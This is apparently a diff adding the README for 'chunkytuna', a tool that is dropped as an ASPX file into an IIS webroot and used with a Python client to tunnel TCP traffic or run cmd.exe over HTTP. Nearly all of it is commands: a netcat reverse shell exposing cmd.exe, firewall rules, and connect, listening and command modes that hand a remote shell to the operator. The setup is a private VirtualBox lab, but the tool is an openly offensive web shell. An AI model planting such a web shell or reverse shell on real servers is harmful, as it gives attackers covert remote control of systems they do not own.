@@ -1,0 +1,77 @@
+Usage
+=====
+
+Just drop the file in the webroot.
+
+Tested with: Windows Server 2012 + IIS. 
+
+
+Testing
+=======
+
+Installation and configuration
+------------------------------
+
+ 1. Download and run a windows server evaluation version
+ 1. Install IIS and ASP.NET
+
+Virtualbox-specific instructions:
+
+ 1. mount this directory as a shared folder
+ 2. configure virtualbox to use host-only networking, then
+
+	ifconfig vboxnet0 192.168.56.1
+	iptables -i vboxnet0 -A INPUT -p tcp --dport 12345 -j ACCEPT
+
+ 3. run a reverse shell so it's easy to restart the server (for testing)
+
+	nc.exe 192.168.56.1 12345 -e cmd.exe
+
+ 4. to copy chunkytuna aspx into wwwroot use:
+
+	a.bat 
+ 
+ The batch file copies 'chunkytuna.aspx' into C:\inetpub\wwwroot\ and restarts IIS
+
+Quickstart in Connect mode
+--------------------------
+
+ 5. Make sure your firewall allows inbound connections...
+
+	iptables -i vboxnet0 -A INPUT -p tcp --dport 1234 -j ACCEPT
+
+ 6. Run a listener on the host:
+
+    ncat -lnkvp localhost 1234
+
+ 7. Run chunktuna:
+
+    python chunkytuna.py http://192.168.56.101:80/chunkytuna.aspx C -t 192.168.56.1:1234 -r 127.0.0.1:12346 -d
+ 
+ 8. Connect to chunkytuna:
+
+    ncat localhost 12346
+
+Or use ssh:
+
+    # (make sure virtualbox can connect to port 22 of the host and that sshd is running...)
+    python chunkytuna.py http://192.168.56.101:80/chunkytuna.aspx C -t 192.168.56.1:22 -r 127.0.0.1:12346
+    ssh localhost -p 12346
+
+
+Quickstart in listening mode:
+-----------------------------
+
+    # bind to 0.0.0.0:1234 (on the windows server)
+    python3 chunkytuna.py http://192.168.56.101:80/chunkytuna.aspx L -t 0.0.0.0:12345 -r 127.0.0.1:1234
+    # then open a listener locally
+    ncat -lnvkp 1234
+    # then connect to the remote
+    ncat 192.168.56.101 12345
+    # python will connect to port 1234 and transmit data
+
+Command mode:
+-------------
+
+    python3 chunkytina.py http://192.168.56.101:80/chunkytuna.aspx X -t "cmd.exe" -r 127.0.0.1:12345
+    nc localhost 12345
